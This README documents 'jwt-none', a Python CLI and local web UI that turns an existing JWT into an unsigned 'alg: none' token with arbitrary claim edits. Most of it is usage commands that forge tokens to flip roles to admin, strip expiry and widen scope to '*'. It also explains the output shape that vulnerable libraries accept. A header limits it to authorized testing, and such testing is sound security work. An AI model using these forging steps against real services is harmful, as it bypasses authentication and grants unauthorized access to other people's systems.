# jwt-none

Take an existing JWT and produce an `alg: none` JWT with arbitrary claim edits.
Ships as a Python CLI and a tiny local Flask web UI.

> **For authorized security testing only.** The `alg: none` JWT acceptance flaw
> is an authentication bypass. Don't point this at systems you don't own or
> aren't explicitly allowed to test.

## Install

```bash
python3 -m venv .venv && source .venv/bin/activate
pip install -r requirements.txt   # only needed for the web UI
```

The CLI has zero runtime dependencies — `python3 cli.py ...` works without
installing anything.

## CLI

```bash
# Basic: flip role to admin, drop expiry
python3 cli.py "$JWT" --set role=admin --remove exp

# JSON-typed values (booleans, numbers, arrays, objects):
python3 cli.py "$JWT" \
  --set active=true \
  --set count=3 \
  --set 'tags=["a","b"]' \
  --set 'meta={"src":"forged"}'

# Nested claims (dotted paths):
python3 cli.py "$JWT" --set user.role=admin --remove user.deleted

# Deep-merge a JSON object into the payload:
python3 cli.py "$JWT" --merge-json '{"scope":"*","aud":["api"]}'
python3 cli.py "$JWT" --merge-json-file overrides.json

# Keep extra header fields (kid, cty, ...) instead of stripping them:
python3 cli.py "$JWT" --keep-header-extras --set sub=alice

# Just decode and inspect:
python3 cli.py "$JWT" --decode-only

# Pipe from stdin:
echo "$JWT" | python3 cli.py --set role=admin

# Full JSON result (header + payload + token):
python3 cli.py "$JWT" --set role=admin --json
```

### `--set` value coercion

`KEY=VALUE` is parsed as JSON when possible, otherwise kept as a string:

| Flag                         | Resulting value |
| ---------------------------- | --------------- |
| `--set name=alice`           | `"alice"`       |
| `--set count=3`              | `3`             |
| `--set active=true`          | `true`          |
| `--set ttl=null`             | `null`          |
| `--set 'tags=["a","b"]'`     | `["a","b"]`     |
| `--set 'meta={"k":1}'`       | `{"k":1}`       |

To embed a literal `.` in a key segment (rather than nest into an object),
escape it: `--set 'weird\.key=1'`.

## Web UI

```bash
python3 web.py            # http://127.0.0.1:5000
python3 web.py --port 8000
```

Workflow: paste a JWT, click **Decode**, edit the payload JSON, optionally
queue claims to remove, click **Forge alg:none**, copy the result.

The server binds to `127.0.0.1` by default and has no persistence or auth.

## Output shape

The generated token is

```
base64url(header).base64url(payload).
```

with a trailing dot (the canonical form most vulnerable libraries expect).
Use `--no-trailing-dot` (CLI) or uncheck the option in the UI to omit it.

The forged header is `{"alg":"none","typ":"JWT"}` unless
`--keep-header-extras` is passed, in which case other header fields from the
input are preserved (with `alg` forced to `none`).
